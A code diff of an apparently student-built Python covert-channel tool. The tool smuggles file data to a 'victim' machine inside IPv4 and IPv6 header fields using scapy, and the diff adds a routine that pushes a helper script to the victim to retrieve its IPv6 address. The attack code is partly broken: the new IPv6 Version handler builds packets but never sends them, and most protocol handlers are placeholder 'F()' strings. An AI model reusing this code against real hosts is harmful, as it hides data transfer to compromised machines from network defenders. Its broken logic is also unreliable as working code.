@@ -6,8 +6,8 @@ import sys
 import socket
 import threading
 import time
-from scapy.layers.inet import IP, TCP, IPOption
-from scapy.packet import Raw
+from scapy.layers.inet import IP, TCP
+from scapy.layers.inet6 import IPv6
 from scapy.sendrecv import send
 import constants
 import ipaddress
@@ -304,7 +304,7 @@ def protocol_and_field_selector():
     header = constants.PROTOCOLS_LIST[index - 1]
     num_of_fields = len(constants.PROTOCOL_HEADER_FIELD_MAP[header])
     index = constants.ZERO  # => Reset index
-    __print_header_choices(constants.PROTOCOL_HEADER_FIELD_MAP[header])
+    __print_header_choices(constants.PROTOCOL_HEADER_FIELD_MAP[header], header)
 
     # d) Get header field of choice
     while index <= constants.ZERO or index > num_of_fields:
@@ -333,10 +333,10 @@ def __print_protocol_choices():
     print(constants.MENU_CLOSING_BANNER)
 
 
-def __print_header_choices(protocol_header_list: list):
+def __print_header_choices(protocol_header_list: list, header: str):
     count = 1
 
-    print("[+] Please select a header field for covert file transfer...")
+    print(constants.FIELD_SELECTION_PROMPT.format(header))
     for choice in protocol_header_list:
         print("{} - {}".format(count, choice))
         count += 1
@@ -352,6 +352,78 @@ def __bytes_to_bin(data):
 
 
 # // ===================================== COVERT CHANNEL FUNCTIONS ===================================== //
+
+def __get_target_ipv6_address_helper(sock: socket.socket, dest_ip: str, dest_port: int):
+    # Print operation
+    print(constants.GET_IPV6_MSG.format(dest_ip, dest_port))
+    print(constants.TRANSFER_FILE_INIT_MSG.format(constants.GET_IPV6_SCRIPT_PATH))
+
+    # Check if the file exists
+    if os.path.exists(constants.GET_IPV6_SCRIPT_PATH):
+        print(constants.TRANSFER_FILE_FOUND_MSG.format(constants.GET_IPV6_SCRIPT_PATH))
+        print(constants.TRANSFER_FILE_INIT_MSG.format(constants.GET_IPV6_SCRIPT_PATH))
+
+        # Send file name
+        sock.send(constants.GET_IPV6_SCRIPT_PATH.encode())
+        print(constants.FILE_NAME_TRANSFER_MSG.format(constants.GET_IPV6_SCRIPT_PATH))
+
+        # Wait for client/victim to buffer
+        time.sleep(1)
+
+        # Initiate script transfer
+        with open(constants.GET_IPV6_SCRIPT_PATH, 'rb') as file:
+            while True:
+                file_data = file.read(constants.BYTE_LIMIT)
+                if not file_data:
+                    break
+                sock.send(file_data)
+
+        # Send end-of-file marker
+        sock.send(constants.END_OF_FILE_SIGNAL)
+
+        # Get an ACK from victim for operation success
+        transfer_result = sock.recv(constants.BYTE_LIMIT).decode().split("/")
+
+        if transfer_result[0] == constants.VICTIM_ACK:
+            print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.GET_IPV6_SCRIPT_PATH, dest_ip, dest_port))
+            print(constants.IPV6_OPERATION_SUCCESS_MSG.format(transfer_result[1], transfer_result[2]))
+            return transfer_result[1], transfer_result[2]
+        else:
+            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+            return None, None
+    else:
+        print(constants.FILE_NOT_FOUND_ERROR.format(constants.GET_IPV6_SCRIPT_PATH))
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+        return None, None
+
+
+def __get_target_ipv6_address(sock: socket.socket, dest_ip: str, dest_port: int):
+    """
+    Sends a ipv6_getter.py script to target and awaits for
+    a response containing the IPv6 address and port number.
+
+    @param sock:
+            The client/target socket
+
+    @param dest_ip:
+            A string containing the target IP address
+
+    @param dest_port:
+            An int containing the target IP port number
+
+    @return: (IPv6 address, port)
+            A tuple containing the IPv6 address and port
+            number of the target
+    """
+    dest_ip, dest_port = __get_target_ipv6_address_helper(sock, dest_ip, dest_port)
+    if dest_ip is None or dest_port is None:
+        print(constants.GET_IPV6_ERROR)
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+        return None, None
+    else:
+        return dest_ip, dest_port
 
 
 def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str, file_path: str):
@@ -984,33 +1056,32 @@ def transfer_file_ipv4_dst_addr(client_sock: socket.socket, dest_ip: str, file_p
         send(packet, verbose=0)
 
 
-def __transfer_file_ipv4_dst_addr_error_handler(field: str, header: str):
-    print(constants.IPV4_DESTINATION_ADDRESS_ERROR.format(field, header))
-    print(constants.IPV4_DESTINATION_ADDRESS_ERROR_REASON)
+def __transfer_file_dst_addr_error_handler(field: str, header: str):
+    print(constants.DESTINATION_ADDRESS_ERROR.format(field, header))
+    print(constants.DESTINATION_ADDRESS_ERROR_REASON)
     print(constants.RETURN_MAIN_MENU_MSG)
     print(constants.MENU_CLOSING_BANNER)
 
 
-def transfer_file_ipv4_options(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv6_version(client_sock: socket.socket, dest_ip: str, file_path: str):
     """
-    Hides file data covertly in IPv4 headers using the
-    options (Timestamp) field.
+    Hides file data covertly in IPv6 headers using the
+    version field.
 
     @note Bit length
-        The timestamp options field for IPv4 headers is set to 4 bits
+        The version field for IPv6 headers is 4 bits
 
     @param client_sock:
-        A socket representing the client socket
+        A socket representing the client (target) socket
 
     @param dest_ip:
-        A string representing the destination IP
+        A string representing the destination/target IP
 
     @param file_path:
         A string representing the path of the file
 
     @return: None
     """
-
     # a) Read the content of the file
     with open(file_path, constants.READ_BINARY_MODE) as file:
         file_content = file.read()
@@ -1021,21 +1092,11 @@ def transfer_file_ipv4_options(client_sock: socket.socket, dest_ip: str, file_pa
     # c) Put data in packet
     packets = []
     for i in range(0, len(binary_data), 4):
-        binary_segment = binary_data[i:i+4].ljust(4, '0')
-        timestamp_value = int(binary_segment, 2)
-        packet = IP(dst=dest_ip) / IPOption(timestamp=timestamp_value)
+        binary_segment = binary_data[i:i + 4].ljust(4, '0')
+        version = int(binary_segment, 2)
+        packet = IPv6(dst=dest_ip)
+        packet.version = version
         packets.append(packet)
-
-    # d) Send total number of packets to the client
-    total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
-
-    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
-    time.sleep(1)
-
-    # f) Send packets
-    for packet in packets:
-        send(packet, verbose=0)
 
 
 def __get_protocol_header_function_map():
@@ -1054,10 +1115,42 @@ def __get_protocol_header_function_map():
         ("IPv4", "Header Checksum"): transfer_file_ipv4_header_chksum,
         ("IPv4", "Source Address"): transfer_file_ipv4_src_addr,
         ("IPv4", "Destination Address"): transfer_file_ipv4_dst_addr,
-        ("IPv4", "Options"): transfer_file_ipv4_options,
-        ("IPv4", "Padding"): "F()",
 
         # b) IPv6 Handlers
+        ("IPv6", "Version"): transfer_file_ipv6_version,
+        ("IPv6", "Traffic Class"): "F()",
+        ("IPv6", "Flow Label"): "F()",
+        ("IPv6", "Payload Length"): "F()",
+        ("IPv6", "Next Header"): "F()",
+        ("IPv6", "Hop Limit"): "F()",
+        ("IPv6", "Source Address"): "F()",
+        ("IPv6", "Destination Address"): "F()",
+
+        # c) TCP Handlers
+        ("TCP", "Source Port"): "F()",
+        ("TCP", "Destination Port"): "F()",
+        ("TCP", "Sequence Number"): "F()",
+        ("TCP", "Acknowledgement Number"): "F()",
+        ("TCP", "Header Length"): "F()",
+        ("TCP", "Reserved"): "F()",
+        ("TCP", "Flags"): "F()",
+        ("TCP", "Window Size"): "F()",
+        ("TCP", "Urgent Pointer"): "F()",
+        ("TCP", "Options"): "F()",
+
+        # d) UDP Handlers
+        ("UDP", "Source Port"): "F()",
+        ("UDP", "Destination Port"): "F()",
+        ("UDP", "Length"): "F()",
+        ("UDP", "Checksum"): "F()",
+
+        # e) ICMP Handlers
+        ("ICMP", "Type (Type of Message)"): "F()",
+        ("ICMP", "Code"): "F()",
+        ("ICMP", "Checksum"): "F()",
+        ("ICMP", "Identifier"): "F()",
+        ("ICMP", "Sequence Number"): "F()",
+        ("ICMP", "Timestamp"): "F()",
     }
 
 
@@ -1086,20 +1179,25 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
         if ack == constants.RECEIVED_CONFIRMATION_MSG:
             # Send file name and choices
             sock.send((file_name + "/" + choices[0] + "/" + choices[1]).encode())
-            print(constants.FILE_NAME_TRANSFER_MSG.format(file_name))
+
+            # If IPv6 header chosen, get IPv6 address and port
+            if constants.IPV6 in choices:
+                dest_ip, dest_port = __get_target_ipv6_address(sock, dest_ip, dest_port)
+                if dest_ip is None or dest_port is None:
+                    return None
 
             # Find the choice(header/field) in map, get and call the mapped function
             if choices in header_field_function_map:
                 selected_function = header_field_function_map.get(choices)
 
-                # If choice is covert with IPv4/source IP address
-                if constants.SOURCE_ADDRESS_FIELD in choices:
-                    selected_function(sock, dest_ip, dest_port, source_port, file_path)
-
-                # If choice is covert with IPv4/dest IP address
-                elif constants.DESTINATION_ADDRESS_FIELD in choices:
-                    __transfer_file_ipv4_dst_addr_error_handler(choices[1], choices[0])
+                # If destination address field chosen
+                if constants.DESTINATION_ADDRESS_FIELD in choices:
+                    __transfer_file_dst_addr_error_handler(choices[1], choices[0])
                     return None
+
+                # If choice covert with source IP address field
+                elif constants.SOURCE_ADDRESS_FIELD in choices:
+                    selected_function(sock, dest_ip, dest_port, source_port, file_path)
 
                 # Otherwise, run as intended
                 elif selected_function is not None and callable(selected_function):
